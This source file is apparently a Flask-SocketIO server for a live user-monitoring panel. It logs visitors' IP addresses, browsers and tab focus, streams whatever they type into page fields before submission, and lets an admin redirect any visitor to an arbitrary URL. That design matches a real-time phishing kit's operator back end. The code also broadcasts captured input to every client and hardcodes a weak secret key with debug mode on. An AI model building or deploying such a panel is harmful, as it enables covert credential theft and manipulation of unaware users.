from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

connected_clients = {}
user_inputs = {}

@app.route('/user')
def user():
    return render_template('user.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@socketio.on('user_connect')
def handle_user_connect():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    client_id = request.sid
    connected_clients[client_id] = {
        'ip': client_ip,
        'user_agent': user_agent,
        'tab_status': 'active'
    }
    user_inputs[client_id] = {}
    emit('update_admin', connected_clients, broadcast=True)
    print(f"User connected: {client_id}, IP: {client_ip}, User-Agent: {user_agent}")

@socketio.on('user_tabbed_out')
def handle_user_tabbed_out():
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients[client_id]['tab_status'] = 'tabbed out'
        emit('update_admin', connected_clients, broadcast=True)
        print(f"User {client_id} has tabbed out")

@socketio.on('user_tabbed_in')
def handle_user_tabbed_in():
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients[client_id]['tab_status'] = 'active'
        emit('update_admin', connected_clients, broadcast=True)
        print(f"User {client_id} is back on the tab")

@socketio.on('user_typing')
def handle_user_typing(data):
    client_id = request.sid
    element = data['element']
    value = data['value']
    
    if client_id in user_inputs:
        user_inputs[client_id][element] = value
    
    print(f"Typing event from {client_id}: {element} = {value}")
    emit('update_typing', {'client_id': client_id, 'element': element, 'value': value}, broadcast=True)

@socketio.on('redirect_user')
def handle_redirect_user(data):
    client_id = data['client_id']
    url = data['url']
    if client_id in connected_clients:
        emit('redirect', url, room=client_id)
        print(f"Redirecting user {client_id} to {url}")

@socketio.on('disconnect')
def handle_disconnect():
    client_id = request.sid
    if client_id in connected_clients:
        print(f"User disconnected: {client_id}")
        del connected_clients[client_id]
        if client_id in user_inputs:
            del user_inputs[client_id]
        emit('update_admin', connected_clients, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, debug=True)
